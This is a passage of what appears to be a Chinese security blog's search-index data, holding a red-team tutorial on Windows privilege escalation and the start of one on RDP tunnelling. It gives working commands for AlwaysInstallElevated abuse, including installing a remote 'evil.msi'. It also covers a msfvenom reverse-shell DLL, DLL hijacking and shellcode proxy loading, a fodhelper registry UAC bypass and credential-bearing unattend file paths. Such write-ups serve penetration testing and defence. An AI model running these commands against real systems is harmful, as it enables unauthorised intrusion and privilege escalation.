","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"4.1 查询 查询： reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 未启用 AlwaysInstallElevated 策略，返回结果为：「找不到指定的注册表项或值」 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:1","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"4.2 开启 reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:2","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"4.3 执行 MSI 文件 本地执行：msiexec /q /i C:\\msi.msi /i 参数用来表示安装操作 /q 参数用来隐藏安装界面 并且 MSIEXEC 也可以实现无落地文件的方式进行木马上线的方式，当然低权限用不了，因为 msi 文件需要可信的证书才能远程利用 AlwaysInstallElevated 提权：msiexec /q /i http://ip/evil.msi ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:3","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"4.4 利用 4.4.1 PowerUP 脚本 https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 测试是否启用 AlwaysInstallElevated： Import-Module .\\PowerUp.ps1 Get-RegistryAlwaysInstallElevated 返回 True 代表开启。 4.4.2 MSI Wrapper 添加用户 MSI Wrapper 下载地址：https://www.exemsi.com/download/ 将 Payload 设置为执行 ProcessHacker： 运行时要求提升权限： MSI installation context 下选择 Per User 和 Per Machine 都可以。 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:4:4","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"5 无人值守安装文件 一些 windows 无人值守安装文件中含有用户的明文或 base64 编码后的密文 dir /s *sysprep.inf *sysprep.xml *unattend.xml *unattend.txt 2\u003enul 常见位置： C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windos\\System32\\sysprep\\unattend.xml C:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:5:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"6 DLL 劫持提权 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"6.1 相关概念 6.1.1 DLL 简介 何为劫持 在正常事物发生之前进行一个旁路操作 动态链接库(Dynamic-Link-Library，缩写 dll)。在 Windows 中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即 DLL 文件，放置于系统中。当执行某一个程序时，相应的 DLL 文件就会被调用。一个应用程序可使用多个 DLL 文件，一个 DLL 文件也可能被不同的应用程序使用，这样的 DLL 文件被称为共享 DLL 文件。 6.1.2 DLL 的加载顺序 微软的 DLL 劫持分为三个阶段 无保护阶段：Windows XP SP2 之前 保护阶段：Windows XP SP2 之后，Windows 7 之前 进一步保护阶段：Windows 7 之后 Windows XP SP2 之前 进程对应的应用程序所在目录； 加载 DLL 时所在的当前目录 (SetCurrentDirectory)； 系统目录即 SYSTEM32 目录（通过 GetSystemDirectory 获取）； 16 位系统目录即 SYSTEM 目录； Windows 目录：C:\\Windows（通过 GetWindowsDirectory 获取）； PATH 环境变量中的各个目录； Windows XP SP2 之后 微软为了防止 DLL 劫持漏洞的产生，在 XP SP2 之后，添加了一个 SafeDllSearchMode 的注册表属性。注册表路径如下： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode 当 SafeDllSearchMode 的值设置为 1，即安全 DLL 搜索模式开启时，查找 DLL 的目录顺序如下： 应用程序所在目录； 系统目录 SYSTEM32 目录； 16 位系统目录即 SYSTEM 目录。该项只是为了向前兼容的处理，可以不考虑 Windows 目录。通常是C:\\Windows； 加载 DLL 时所在的当前目录； 环境变量 PATH 中所有目录。需要注意的是，这里不包括 App Paths 注册表项指定的应用程序路径。 win7 之后 微软为了更进一步的防御系统的 DLL 被劫持，将一些容易被劫持的系统 DLL 写进了一个注册表项中，那么凡是此项下的 DLL 文件就会被禁止从 EXE 自身所在的目录下调用，而只能从系统目录即 SYSTEM32 目录下调用。注册表路径如下： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs Windows 操作系统通过「DLL路径搜索目录顺序」和「Know DLLs注册表项」的机制来确定应用程序所要调用的 DLL 的路径，之后，应用程序就将 DLL 载入了自己的内存空间，执行相应的函数功能。 注册表路径：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 6.1.3 分析 DLL 的加载过程 - Process Monitor Process Monitor 是 Windows 的高级监视工具，可显示实时文件系统，注册表和进程/线程活动。 https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-utilities Process Monitor Filter 是用于过滤应用程序输出的一部分功能，可以使得进程事件结果成为你想要的内容。常用过滤条件：Process Name，Path，Result 设置 Process Name is 待测目标，设置 Path ends with .dll，Result is NAME NOT FOUND 6.1.4 DLL 劫持步骤 如果在应用程序寻找成功之前，将我们自己创造的 DLL 文件放入寻找目录中，那么应用程序就会加载我们自己的 DLL ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:1","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"6.2 实现 6.2.1 实现一个 DLL 劫持 BOOL WINAPI DllMain( // 指向自身的句柄 _In_ HINSTANCE hinstDLL, // 调用原因 _In_ DWORD fdwReason, // 加载方式（隐式、显式） _In_ LPVOID lpvReserved ); 载入状态 值 说明 DLL_PROCESS_ATTACH 1 被进程装载时 DLL_PROCESS_DETACH 0 被进程卸载时 DLL_THREAD_ATTACH 2 被线程装载时 DLL_THREAD_DETACH 3 被线程卸载时 BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ printf(\"hModule.%p lpReserved.%p \\n\", hModule, lpReserved); switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: printf(\"Process attach. \\n\"); break; case DLL_PROCESS_DETACH: printf(\"Process detach. \\n\"); break; case DLL_THREAD_ATTACH: printf(\"Thread attach. \\n\"); break; case DLL_THREAD_DETACH: printf(\"Thread detach. \\n\"); break; } return (TRUE); } 如果应用程序调用的 DLL 没有 DLLMain 函数就需要实现指定导出函数，然后等待导出函数执行完毕再 Load 真实 DLL。 6.2.2 msf MSF 生成 payload： msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll \u003e a.dll ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:2","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"6.3 自动化工具检测 6.3.1 rattler https://github.com/sensepost/rattler 实现思路： 枚举进程调用的 dll 列表，解析出 dll 的名称 将测试 dll 分别重命名为列表中的 dll 名称 再次启动程序，检测是否成功创建进程 calc.exe，如果成功，代表存在漏洞，否则不存在 测试： 使用 Visual Studio 编译 Rattler，将 payload.dll 放于同级目录下 payload.dll 下载地址： https://github.com/sensepost/rattler/releases/download/v1.0/payload.dll 管理员权限的 cmd 下运行命令： Rattler.exe [待检测程序名称] 1 6.3.2 ChkDllHijack 使用 windbg 导出 module： 打开 chkDllHijack，粘贴处要验证的 DLL 内容，等待其运行完毕，检查结果： ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:3","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"6.4 DLL Side-Loading(DLL Proxy Loading) 6.4.1 原理 不使应用程序崩溃的情况下利用 DLL Hijack 漏洞。将合法函数调用重定向到原始 DLL，在后台静默加载我们的 shellcode。 DLL Side-Loading 与 DLL 劫持非常相似。但是，它不会破坏原始程序的执行流程或功能。，将恶意程序隐藏在合法应用程序之后，同时也可以利用该方法维持权限。 DLL Proxy 流程图： 启动时，应用程序 A 需要使用名为 GetFunkyData() 的第三方函数来获取数据，GetFunkyData() 存在于动态链接库中，该动态链接库位于应用程序的工作目录中，名为 DataFunctions_Original.dll (B)。 应用程序 A 以其名称加载库 DataFunctions.dll，以尝试执行 GetFunkyData()。 该 DLL 实际上是攻击者专门设计的“代理”库，代理 DLL 使用将函数调用重定向到原始 DLL“ DataFunctions_Original.dll”（B）。 此时，攻击者已经劫持了执行流程（C），并且可以代表运行中的进程（E）执行代码，而无需用户或应用程序的了解。 6.4.2 利用 https://github.com/Flangvik/SharpDllProxy SharpDllProxy.exe --dll /path/to/targetDLL.dll --payload shellcode.bin 现在需要将程序生成的源码进行编译，打开 VS 2019，选择创建新工程： 选择 C++ 语言，搜索 Library ，然后点击 DLL模板： 项目名称应该匹配我们要劫持的 DLL 名称。将工具生成的代码内容复制到 dllmain.cpp 中： 当 DLL_PROCESS_ATTACH 时间被触发时，DLL 会创建一个新线程。DoMagic() 函数从 shellcode.bin 读取 payload 到内存中，并执行。 下一步即可编译该 DLL 库文件，选择合适的架构：x64/x86，然后选择 release，build 即可。 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:6:4","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"7 Bypass UAC ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"7.1 原理及概念 User Account Control(UAC)是在 Windows Vista 以后版本中引入的一种安全机制，针对具有有限权限的账户。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。 7.1.1 UAC 的实现 ACL（Access Control List）：Windows 中所有资源都有 ACL ，这个列表决定了拥有何种权限的用户/进程能够这个资源。 在开启了 UAC 之后，如果用户是标准用户， Windows 会给用户分配一个标准 Access Token 如果用户以管理员权限登陆，会生成两份访问令牌，一份是完整的管理员访问令牌（Full Access Token），一份是标准用户令牌。一般情况下会以标准用户权限启动 Explorer.exe 进程。如果用户同意，则赋予完整管理员权限访问令牌进行操作。 7.1.2 配置 UAC 策略 Win+R，输入 gpedit.msc，打开组策略，在「计算机配置 – Windows设置 – 安全设置 – 本地策略 – 安全选项」，再在右侧窗口找到「用户帐户控制： 管理员批准模式中管理员的提升权限提示的行为」，如下图： 不提示直接提升：关闭 UAC，需要权限时直接提升权限。 在安全桌面上提示凭据：需要权限时在安全桌面上输入管理员密码提升权限。 在安全桌面上同意提示：需要权限时在安全桌面上选择「允许」提升权限。 提示凭据：需要权限时在普通窗口中输入管理员密码提升权限。 同意提示：需要权限时在普通窗口中选择「允许」提升权限。 非 Windows 二进制文件的同意提示：(默认设置) 当非 Microsoft 应用程序的某个操作需要提升权限时，选择「允许」提升权限。 7.1.3 提示 UAC 的情况 因为普通应用执行权限有限，某些操作必然会要求更高的管理员权限。此时，通常就需要一个权限提升的操作。程序可以向系统请求提权，系统会将此请求通过提一个提示框，请用户确认。 触发 UAC 的行为： 配置Windows Update 增加或删除用户账户 改变用户的账户类型 改变 UAC 设置 安装 ActiveX 安装或移除程序 安装设备驱动程序 设置家长控制 将文件移动或复制到 Program Files 或 Windows 目录 查看其他用户文件夹 如果当前用户的用户组权限不是管理员，提权操作是要求输入管理员密码的，这点和在 Linux 中的相应操作类似。 程序只能在运行前要求提权。如果已经在运行了，那么将失去申请提权的能力 权限提升仅对此次进程有效 提升权限的操作大致有两个： 自动提权请求 手动提权请求 手动提权就是「以管理员身份运行」，自动提权请求就是程序本身就一运行就开始申请权限，如：注册表编辑器 在开发的过程中，程序员若要开发一个程序，可以在编译器配置，写入一个配置文件，用于向系统标识该应用程序是必须要管理员权限运行的。 aslnvoker 默认权限 highestAvailable 最高权限 requireAdministrator 必须是管理员权限 将编译选项调整为 requireAdministrator，当用户运行程序后，将获得管理员权限会话，不需要绕过 UAC 了。 manifest 中其实还有其他属性，如：autoElevate（自动提升） ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:1","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"7.2 auto Elevate 自动提升权限分析 拥有自动权限提升属性的文件，会在启动时自动提升权限，而这些应用程序往往都具备微软的签名，微软认为它是可信的。故此，在该程序启动时，将会以管理员身份启动，假设通过 DLL 劫持，也能获得管理员权限。 但是： 可能分析成本较高 可能需要高权限才能够完成 7.2.1 寻找 auto Elevate https://github.com/g3rzi/Manifesto 如果上述程序存在 DLL 劫持漏洞，那么普通用户就可以用低权限绕过 UAC 确认，以高权限执行任意代码。 7.2.2 手动 bypass UAC C:\\Windows\\system32\\odbcad32.exe 该程序用于配置 ODBC 数据源，但提供了一个输入点，那就是文件浏览器，通过文件浏览器我们可以打开一个管理员权限的 Powershell。 还有一个特别典型的例子就是：CVE-2019-1388 证书提权漏洞。 通过点击「展示证书发行者的详细信息」链接会触发 consent.exe 以 SYSTEM 权限打开浏览器访问此链接，然后此浏览器就会有 SYSTEM 权限。通过保存该浏览页面，会弹出微软的资源管理器，在资源管理器中邮件打开 cmd.exe 程序，就会继承浏览器的 SYSTEM 权限，由此就完成了由普通用户到 NT AUTHORITY\\SYSTEM 用户的提权。 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:2","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"7.3 利用注册表 bypass UAC 一些高权限的程序会调用 HKCR:\\ 下的键值。 流程： 通过修改 HKCU:\\ 下面的键值同步修改 HKCR:\\ 下的键值。 把原本的键值改为 cmd.exe 等 shell 程序。 如果高权限的程序在运行过程中调用此处被修改过的键值，就会以高权限启动我们设定的程序。 如此便实现了 Bypass UAC。 常见的有：eventvwr.exe、fodhelper.exe，下面以 fodhelper.exe 为例： Path：C:\\Windows\\system32\\fodhelper.exe REG：HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Windows\\System32\\cmd.exe /f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f 在 msf 中已经集成了相应的利用方式。 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:3","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"7.4 UACME 工具地址：https://github.com/hfiref0x/UACME，内含 60+ 种 BypassUAC 的方法 工具列表如下: Akagi 是项目的主程序，其中包含了所有的 Methods，绕过 UAC 的主要方法的源码都在 Method 目录下，会以 UAC 绕过方法的发现者的名字来命名源文件。 clone 到本地后，用 VS2019 打开，选择 uacme.vcxproj，以 Release|x64 去 build，然后 ctrl+b build 项目，生成的项目在 source/Akag/output 下 使用 vs2019 本地编译后可以使用 akagi32 41 或者 akagi64 41 启动程序，41 这个指的是 README 中描述的方法索引，运行后可以直接得到管理员权限的 cmd 窗口： ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:7:4","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"8 自动化检测 winPEAS 工具地址：https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:8:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"9 土豆类提权 在「potato 家族提权分析」中已有介绍，再次不做赘述。 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:9:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试","提权"],"content":"10 参考 http://www.fuzzysecurity.com/tutorials/16.html https://www.xazlsec.com/index.php/archives/245/ https://at449.com/2020/04/09/2007/ https://www.xazlsec.com/index.php/archives/1164/ 酒仙桥六号部队 - 红队测试之Windows提权小结 https://3gstudent.github.io/DLL劫持漏洞自动化识别工具Rattler测试/ https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/ https://payloads.online/archivers/2020-03-02/2 http://blog.leanote.com/post/snowming/ec21a4823438 ","date":"2021-01-26","objectID":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/:10:0","tags":["渗透测试","提权"],"title":"Windows 提权方式总结","uri":"/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试"],"content":"红蓝对抗中 RDP 协议的利用思路整理","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"红蓝对抗中 RDP 协议的利用 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:0:0","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"1 SocksOverRDP ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:1:0","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"1.1 工具介绍 当防火墙规则配置为：只有 tcp/udp 3389 端口可以进行通信时，可以利用 RDP 协议，建立 Socks 通道。应用场景较为极端。 工具地址：https://github.com/nccgroup/SocksOverRDP 此工具在 RDP 协议的基础上实现了 Socks 代理功能。 就像 SSH 的 -D 参数一样，在连接后，利用 RDP 协议实现代理功能。 该工具包含两个部分： .dll，需要在客户端上进行注册，并在每次运行时将其加载到远程桌面客户端的上下文运行环境中。 .exe，它是服务端组件，需要复制到服务器并执行。无需安装，无需配置。 在远程桌面连接的服务器端执行 .exe 时，它会通过动态虚拟通道（RDP 协议的特性）连接回客户端，并在客户端启动 SOCKS 代理。该代理默认情况下侦听 127.0.0.1:1080，可以在浏览器或工具中将其配置为代理。 信息 服务器上的程序不需要服务器端的任何特殊特权，还允许低特权用户打开虚拟通道并通过连接进行代理。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:1:1","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"1.2 工具测试 1.2.1 客户端 .dll 需要放置在客户端计算机上的任何目录中，为了方便使用，可以该文件复制到 ％SYSROOT％\\system32\\ 或 ％SYSROOT％\\SysWoW64\\ 环境变量下。 使用以下命令进行安装注册该 DLL： regsvr32.exe SocksOverRDP-Plugin.dll 取消注册： regsvr32.exe /u SocksOverRDP-Plugin.dll 在 RDP Client 中启动 mstsc.exe 时可以看到如下提示： 1.2.2 服务端 直接执行：SocksOverRDP-Server.exe 即可 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:1:2","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"2 RDP to TCP 使用场景仍然是：由于防火墙的设置，只能连接一台 Windows 服务器的远程桌面，那么如何以这台 Windows 服务器为跳板进入内网 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:2:0","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"2.1 工具介绍 工具地址：https://github.com/V-E-O/rdp2tcp 工具原理：使用 RDP 虚拟通道功能来复用端口 可用的功能： 正向 TCP 端口转发 反向 TCP 端口转发 处理标准输入/输出转发 SOCKS5 代理 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:2:1","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"2.2 工具测试 2.2.1 下载并编译rdp2tcp 安装 mingw-w64 apt-get install mingw-w64 下载 rdp2tcp git clone https://github.com/V-E-O/rdp2tcp.git 修改配置文件 rdp2tcp 默认不支持编译 64 位的 exe，所以这里需要修改配置文件，增加编译 64 位 exe 的配置信息 修改文件Makefile，新的内容如下： all: client server-mingw64 client: client/rdp2tcp client/rdp2tcp: make -C client #server-mingw32: server/rdp2tcp.exe #server/rdp2tcp.exe: # make -C server -f Makefile.mingw32 server-mingw64: server/rdp2tcp64.exe server/rdp2tcp64.exe: make -C server -f Makefile.mingw64 clean: make -C client clean # make -C server -f Makefile.mingw32 clean make -C server -f Makefile.mingw64 clean make -C tools clean 新建文件 /server/Makefile.mingw64，内容如下： BIN=rdp2tcp64.exe CC=i686-w64-mingw32-gcc CFLAGS=-Wall -g \\ -D_WIN32_WINNT=0x0501 \\ -I../common # -D_WIN32_WINNT=0x0501 # -D_WIN32_WINNT=0x0501 -DDEBUG LDFLAGS=-lwtsapi32 -lws2_32 OBJS= ../common/iobuf.o \\ ../common/print.o \\ ../common/msgparser.o \\ ../common/nethelper.o \\ ../common/netaddr.o \\ errors.o aio.o events.o \\ tunnel.o channel.o process.o commands.o main.o all: clean_common $(BIN) clean_common: $(MAKE) -C ../common clean $(BIN): $(OBJS) $(CC) -o $@ $(OBJS) $(LDFLAGS) %.o: %.c $(CC) $(CFLAGS) -o $@ -c $\u003c clean: rm -f $(OBJS) $(BIN) 编译 make 2.2.2 使用 xfreerdp 连接远程桌面并建立通道 执行 xfreerdp 并开启 TCP 重定向功能 /opt/freerdp-nightly/bin/xfreerdp /v:IP:3389 /u:user /p:passwd /cert-ignore /rdp2tcp:/root/rdp2tcp/client/rdp2tcp 将 rdp2tcp64.exe 上传至 RDP Server 并执行(不需要管理员权限) 在客户端系统上启动 rdp2tcp.py cd rdp2tcp/tools python rdp2tcp.py 添加正向端口转发(本地 445 -\u003e 192.168.112.129:445)的命令如下： python rdp2tcp.py add forward 127.0.0.1 445 192.168.112.129 445 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:2:2","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"3 利用 RDP 横向移动 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:3:0","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 